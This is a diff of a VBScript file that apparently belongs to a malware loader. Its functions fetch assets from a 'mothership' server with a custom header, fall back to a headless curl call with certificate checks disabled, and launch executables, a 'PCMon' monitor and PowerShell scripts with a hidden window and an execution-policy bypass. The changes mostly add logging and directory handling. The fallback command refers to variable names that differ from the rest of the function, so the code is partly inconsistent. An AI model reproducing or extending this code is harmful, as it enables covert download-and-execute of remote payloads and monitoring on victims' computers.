@@ -241,24 +241,38 @@ Function HeadersToDict(responsetext)
 End Function
 
 Function RetrieveAsset(fname, localfpath)
+    Dim pp : pp = "RetrieveAsset"
     
     Dim headersout
     Dim headersin : set headersin = GetBunnyHeaderDict()
     
     RetrieveAsset = DownloadFileWithHeaders(mothershipassets & "/ow/assets/" & fname, localfpath, headersin, headersout)
     
+    If not RetrieveAsset Then
+        Call LogMsg(pp & " -- download failed")
+    Else
+        Call LogMsg(pp & " -- download success")
+    End If
+    
     If not fso.FileExists(localfpath) Then
+        Call LogMsg(pp & " -- local file does not exist -- trying again using curl")
+        
         Dim cmdstr
         cmdstr = "conhost.exe --headless cmd /c curl -kso " & localpath & " -G " & dq & url & dq 
         
-        If not XIsEmpty(bunnyheader) Then        
-            cmdstr = cmdstr & " -H " & dq & bunnyheader & dq 
+        If not XIsEmpty(bunnyheader) Then
+            cmdstr = cmdstr & " -H " & dq & bunnyheader & dq
         End If
         
         RetrieveAsset = RunShell(cmdstr, True)
-        ' anchor
     End If
     
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+    End If
+    
+    Call LogMsg(pp & " -- finished")
 End Function
 
 Function DownloadFile(sURL, headersin, sFile)
@@ -608,6 +622,7 @@ Function ExecShell(cmdstr)
     
     ExecShell = -1
     
+    ' anchor
     Dim objExec : Set objExec = WshShell.Exec(cmdstr)
 
     ExecShell = objExec.ProcessID
@@ -1718,7 +1733,11 @@ Function ActivateExe(texedir, texefname, texename, argarr)
     
     Call LogMsg(pp & ": [" & texename & "] cmd is not running -- starting it up")
 
+    WshShell.CurrentDirectory = texedir
+    
     ActivateExe = ExecExe(texename, texefname, texedir, argarr)
+
+    WshShell.CurrentDirectory = workdir
 
     Call LogMsg(pp & ": pid=" & CStr(ActivateExe))
     
@@ -1802,9 +1821,13 @@ Function ExecPowerShell(scriptname, scriptdir, scriptfname, args)
         
     Dim cmdlogfpath : cmdlogfpath = scriptfpath & "_" & CStr(GetRandom(4)) & "_cmd.log"
     
+    WScript.CurrentDirectory = scriptdir
+    
     Dim cmdstr : cmdstr = "powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass -File " & " " & scriptfpath & " " & argstr & " > " & cmdlogfpath & " 2>&1"
            
     Dim pid : pid = ExecShell(cmdstr)
+
+    WScript.CurrentDirectory = workdir
     
     Dim cmdrunpath : cmdrunpath = scriptdir & "\" & scriptname & "_running"
 
@@ -1932,6 +1955,7 @@ Function StartPCMon()
     End If
     
     Dim pcmonfpath : pcmonfpath = pcmondir & "\" & pcmonfname
+    
     If not fso.FileExists(pcmonfpath) Then
         Call LogMsg(cmdname & " downloading " & pcmonfpath)
         Call RetrieveAsset(pcmonfname, pcmonfpath)
